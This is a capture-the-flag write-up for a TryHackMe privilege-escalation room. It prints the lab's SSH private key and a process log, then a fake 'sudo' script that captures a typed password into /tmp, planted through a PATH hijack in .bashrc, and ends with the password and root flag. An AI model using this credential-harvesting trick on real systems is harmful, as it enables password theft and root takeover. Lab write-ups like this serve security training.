### EavesDropper TryHackMe

### Difficulty = Medium

### Description: Hello again, hacker. After uncovering a user Frank's SSH private key, you've broken into a target environment.

We're given the ssh key to login as frank

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
F5iAvxBl12p5cAAAAKam9obkBhbGllbgE=
-----END OPENSSH PRIVATE KEY-----
```

I'll set the permission to 600 then ssh as user frank

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/B2B/THM/Eavesdropper]
└─$ chmod 600 idrsa.id-rsa
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/Desktop/B2B/THM/Eavesdropper]
└─$ ssh -i idrsa.id-rsa frank@10.10.162.146
The authenticity of host '10.10.162.146 (10.10.162.146)' can't be established.
ED25519 key fingerprint is SHA256:WaKDmh6WMRiZ/ysLM5UQM/UirbKKHGy+jRJ5euxQS84.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:47: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.162.146' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Mar 15 00:47:25 2022 from 172.18.0.2
frank@workstation:~$ 
```

I'll upload pspy which is a process monitoring tool

```
frank@workstation:~$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/02/05 13:25:50 CMD: UID=0    PID=8      | sshd: frank [priv]   
2023/02/05 13:25:50 CMD: UID=1000 PID=396    | ./pspy64 
2023/02/05 13:25:50 CMD: UID=1000 PID=21     | -bash 
2023/02/05 13:25:50 CMD: UID=1000 PID=19     | sshd: frank@pts/0    
2023/02/05 13:25:50 CMD: UID=0    PID=1      | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/02/05 13:26:00 CMD: UID=0    PID=404    | sshd: [accepted]  
2023/02/05 13:26:00 CMD: UID=0    PID=405    | sshd: [accepted]     
2023/02/05 13:26:00 CMD: UID=0    PID=406    | sshd: frank [priv]   
2023/02/05 13:26:00 CMD: UID=0    PID=407    | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2023/02/05 13:26:00 CMD: UID=0    PID=408    | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/05 13:26:00 CMD: UID=0    PID=409    | /bin/sh /etc/update-motd.d/00-header 
2023/02/05 13:26:00 CMD: UID=0    PID=410    | /bin/sh /etc/update-motd.d/00-header 
2023/02/05 13:26:00 CMD: UID=0    PID=411    | /bin/sh /etc/update-motd.d/00-header 
2023/02/05 13:26:00 CMD: UID=0    PID=412    | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/05 13:26:01 CMD: UID=0    PID=413    | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/05 13:26:01 CMD: UID=0    PID=414    | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/05 13:26:01 CMD: UID=0    PID=415    | sshd: frank [priv]   
2023/02/05 13:26:01 CMD: UID=1000 PID=416    | sshd: frank@pts/1    
2023/02/05 13:26:02 CMD: UID=1000 PID=417    | sshd: frank@pts/1    
2023/02/05 13:26:03 CMD: UID=1000 PID=418    | sshd: frank@pts/1    
2023/02/05 13:26:04 CMD: UID=1000 PID=419    | sshd: frank@pts/1    
2023/02/05 13:26:04 CMD: UID=1000 PID=420    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=421    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=422    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=423    | /bin/sh /etc/init.d/dbus status 
2023/02/05 13:26:04 CMD: UID=1000 PID=425    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=424    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=426    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=427    | /bin/sh /etc/init.d/hwclock.sh status 
2023/02/05 13:26:04 CMD: UID=1000 PID=429    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=428    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=430    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=431    | /bin/sh /etc/init.d/procps status 
2023/02/05 13:26:04 CMD: UID=1000 PID=432    | /bin/sh /etc/init.d/procps status 
2023/02/05 13:26:04 CMD: UID=1000 PID=433    | /bin/sh /etc/init.d/procps status 
2023/02/05 13:26:04 CMD: UID=1000 PID=434    | /bin/sh /etc/init.d/procps status 
2023/02/05 13:26:04 CMD: UID=1000 PID=436    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=435    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=437    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=440    | /bin/sh /etc/init.d/ssh status 
2023/02/05 13:26:04 CMD: UID=1000 PID=439    | /bin/sh /etc/init.d/ssh status 
2023/02/05 13:26:04 CMD: UID=1000 PID=438    | /bin/sh /etc/init.d/ssh status 
2023/02/05 13:26:04 CMD: UID=1000 PID=441    | /bin/sh /etc/init.d/ssh status 
2023/02/05 13:26:04 CMD: UID=1000 PID=442    | /bin/sh /etc/init.d/ssh status 
2023/02/05 13:26:04 CMD: UID=1000 PID=443    | /bin/sh /etc/init.d/ssh status 
2023/02/05 13:26:04 CMD: UID=1000 PID=445    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:04 CMD: UID=1000 PID=444    | /bin/sh /usr/sbin/service --status-all 
2023/02/05 13:26:05 CMD: UID=1000 PID=446    | sshd: frank@pts/1    
2023/02/05 13:26:06 CMD: UID=1000 PID=447    | sshd: frank@pts/1    
2023/02/05 13:26:06 CMD: UID=0    PID=448    | sudo cat /etc/shadow 
```

From the result we see there's a cron running `sudo cat /etc/shadow` 

The problem is that it doesn't specify the full path to the `sudo & cat` binary

With this we can do path hijack so basically when `sudo` is called it will look up where it is in the path

And if we make a malicious binary named `sudo` we can hijack the real `sudo` binary

But here's the problem we see from the process  that it's only when the user ssh to the box that the sudo command is called

Therefore making the user input his password 

With this i can make a script to read the input then save the password in the /tmp directory

Here's the script 

```
#!/usr/bin/bash

read -sp 'Password: ' Password #reads the userpass and save it in the variable password

echo $Password > /tmp/passwd.txt #echos the password and save it in /tmp/passwd.txt
```

Now here's the way to go around it 😉

```
frank@workstation:~$ cd /tmp
frank@workstation:/tmp$ nano sudo
frank@workstation:/tmp$ chmod +x sudo 
frank@workstation:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
frank@workstation:/tmp$ export PATH=/tmp:$PATH
frank@workstation:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
frank@workstation:/tmp$ 
```

After about a minute check the /tmp directory you will see the content of the user password (not)

The sudo command is called when the user logins so i'll exit then login back

But theres one thing that will stop us which is the PATH reset so basically the path will reset to its original value

This can be fixed by putting the path in the user's .bashrc file

The .bashrc file is a script file that's executed when a user logs in

```
frank@workstation:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
frank@workstation:~$ nano .bashrc
frank@workstation:~$ cat .bashrc | head
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
PATH=/home/frank:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

frank@workstation:~$ 
```

With this i'll exit and login back

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/B2B/THM/Eavesdropper]
└─$ ssh -i idrsa.id-rsa frank@10.10.244.20
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Feb  5 15:11:15 2023 from 172.18.0.2
frank@workstation:~$ ls /tmp
passwd.txt  pspy64
frank@workstation:~$ cat /tmp/passwd.txt 
!@#frankisawesome2022%*
frank@workstation:~$ 
```

Boom! We get it :)

With this i'll su to root but we need to specify the full path of sudo binary cause we messed with it already

```
frank@workstation:~$ /usr/bin/sudo su
[sudo] password for frank: 
root@workstation:/home/frank# cd
root@workstation:~# ls
flag.txt
root@workstation:~# cat flag.txt 
flag{14370304172628f784d8e8962d54a600}
root@workstation:~#
```

To fix the path we can do this

```
frank@workstation:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:$PATH
frank@workstation:~$ sudo su
root@workstation:/home/frank# cd
root@workstation:~# ls
flag.txt
root@workstation:~# cat flag.txt 
flag{14370304172628f784d8e8962d54a600}
root@workstation:~# 
```

And we're done 

<br> <br>
[Back To Home](../../index.md)




